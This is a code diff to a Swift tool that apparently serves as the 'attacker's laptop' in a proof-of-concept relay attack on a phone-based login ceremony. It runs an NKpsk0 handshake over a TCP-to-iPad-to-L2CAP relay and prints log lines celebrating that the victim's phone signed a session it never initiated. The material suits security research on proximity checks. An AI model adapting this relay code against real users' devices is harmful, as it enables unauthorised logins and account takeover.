@@ -4,30 +4,33 @@
 //
 //  A command-line Swift tool. The Mac has NO Bluetooth role here. It:
 //    1. Listens on TCP :7070 for the iPad collector.
-//    2. Runs the HONEST initiator side of the handshake + assertion,
+//    2. Runs the NKpsk0 initiator side of the handshake (P-256/AES-GCM/SHA-256),
 //       driving frames down the TCP bridge. The iPad relays them to the
 //       phone over L2CAP and relays replies back.
 //    3. On success, prints: a shared session key agreed with a phone it
 //       has never seen on a radio, a valid assertion signature, and the
 //       app-layer RTT — which is far too coarse to reveal the relay.
 //
-//  Build:  swiftc -O main.swift ../Shared/Protocol.swift ../Shared/NoiseBox.swift -o relaybrowser
-//  Run:    ./relaybrowser
-//
-//  This file is the "attacker's laptop" that completes a login the victim
-//  never initiated. Everything it does is cryptographically legitimate.
+//  Build:
+//    swiftc -O main.swift ../Shared/Protocol.swift ../Shared/Noise.swift \
+//      ../Shared/Handshake.swift ../Shared/Crypter.swift ../Shared/CableP256.swift \
+//      ../Shared/HKDFShim.swift ../Shared/NoiseBox.swift ../Shared/AxiomLog.swift \
+//      ../Shared/AxiomConfig.swift -o relaybrowser
+//  Run:
+//    ./relaybrowser
 //
 
 import Foundation
 import Network
+import CryptoKit
 
 final class RelayBrowser {
     private var listener: NWListener!
     private var conn: NWConnection?
     private var rxBuffer = Data()
 
-    private let identity = Identity()
-    private var noise: NoiseBox!
+    private var initiator: CableHandshake.Initiator!
+    private var crypter: Crypter?
     private var probeSentAt: UInt64 = 0
     private var challenge = Data()
     private var sessionCount = 0
@@ -43,7 +46,10 @@ final class RelayBrowser {
     }
 
     private func resetSession() {
-        noise = NoiseBox(role: .initiator, staticKey: identity)
+        initiator = CableHandshake.Initiator(
+            psk: PoCKeys.psk,
+            peerIdentity: PoCKeys.responderPublicX962)
+        crypter = nil
         challenge = Data("session-\(UUID().uuidString)".utf8)
         probeSentAt = 0
         rxBuffer = Data()
@@ -56,6 +62,7 @@ final class RelayBrowser {
         listener.start(queue: .main)
         let addrs = Self.localIPs()
         line("[MAC] relay-browser listening on :7070 — waiting for iPad collector")
+        line("[MAC] Noise: NKpsk0 / P-256 / AES-256-GCM / SHA-256 (PXP-aligned)")
         for addr in addrs { line("[MAC]   -> enter \(addr) on the iPad") }
         RunLoop.main.run()
     }
@@ -71,7 +78,7 @@ final class RelayBrowser {
         c.stateUpdateHandler = { [weak self] st in
             switch st {
             case .ready:
-                self?.line("[MAC] collector connected (session \(self?.sessionCount ?? 0)); starting ceremony across the relay")
+                self?.line("[MAC] collector connected (session \(self?.sessionCount ?? 0)); starting NKpsk0 ceremony across relay")
                 self?.receive()
                 self?.startHandshake()
             case .failed(let e):
@@ -107,9 +114,9 @@ final class RelayBrowser {
     }
 
     private func startHandshake() {
-        let m1 = noise.makeInit()
+        let m1 = Data(initiator.buildInitialMessage())
         send(Message(type: .handshakeInit, body: m1))
-        line("[MAC] -> handshakeInit (over relay)")
+        line("[MAC] -> handshakeInit (NKpsk0, \(m1.count) bytes, over relay)")
     }
 
     private func handle(_ frame: Data) {
@@ -117,18 +124,23 @@ final class RelayBrowser {
         switch msg.type {
 
         case .handshakeResp:
-            line("[MAC] <- handshakeResp")
-            let m3 = try! noise.makeFinal(consuming: msg.body ?? Data())
-            send(Message(type: .handshakeFinal, body: m3))
-            line("[MAC] -> handshakeFinal; session key AGREED with a phone seen only via relay")
-            if let k = noise.sessionKey {
-                let hex = k.withUnsafeBytes { $0.map { String(format: "%02x", $0) }.joined() }
-                line("[MAC] session key = \(hex.prefix(32))… (shared, end-to-end, through the relay)")
+            line("[MAC] <- handshakeResp (\(msg.body?.count ?? 0) bytes)")
+            guard let body = msg.body,
+                  let result = initiator.processResponse([UInt8](body))
+            else {
+                line("[MAC] NKpsk0 handshake FAILED"); return
             }
+            crypter = result.crypter
+            line("[MAC] NKpsk0 complete; session key AGREED with phone seen only via relay")
+            line("[MAC]   cipher: AES-256-GCM | curve: P-256 | hash: SHA-256")
+
             probeSentAt = nowMicros()
             send(Message(type: .proximityProbe, probeNonce: 1, tMicros: probeSentAt))
-            let sealed = try! noise.seal(challenge)
-            send(Message(type: .assertionRequest, body: sealed))
+
+            guard let sealed = crypter?.encrypt([UInt8](challenge)) else {
+                line("[MAC] encrypt failed"); return
+            }
+            send(Message(type: .assertionRequest, body: Data(sealed)))
             line("[MAC] -> assertionRequest (asking victim's phone to sign MY session)")
 
         case .proximityEcho:
@@ -136,10 +148,13 @@ final class RelayBrowser {
             line(String(format: "[MAC] app-layer RTT = %.1f ms — cannot distinguish 1m from a cross-country relay", Double(rttMicros)/1000.0))
 
         case .assertionResponse:
-            guard let sealed = msg.body, let sig = try? noise.open(sealed) else {
-                line("[MAC] assertion open failed"); return
+            guard let c = crypter,
+                  let sealed = msg.body,
+                  let sig = c.decrypt([UInt8](sealed))
+            else {
+                line("[MAC] assertion decrypt failed"); return
             }
-            let ok = verify(sig, over: challenge)
+            let ok = verify(Data(sig), over: challenge)
             line("[MAC] <- assertionResponse; signature valid = \(ok)")
             line("[MAC] ===== RELAY COMPLETE: victim authenticated a session they never initiated =====")
 
@@ -175,9 +190,6 @@ final class RelayBrowser {
     }
 }
 
-import CryptoKit
-
-// Set up Axiom logging from the same token store p2p-mesh uses.
 if let token = AxiomConfig.token as String?, !token.isEmpty {
     AxiomLog.setup(dataset: AxiomConfig.dataset, token: token, role: "mac-relay")
     print("[MAC] Axiom logging enabled (dataset: \(AxiomConfig.dataset))")
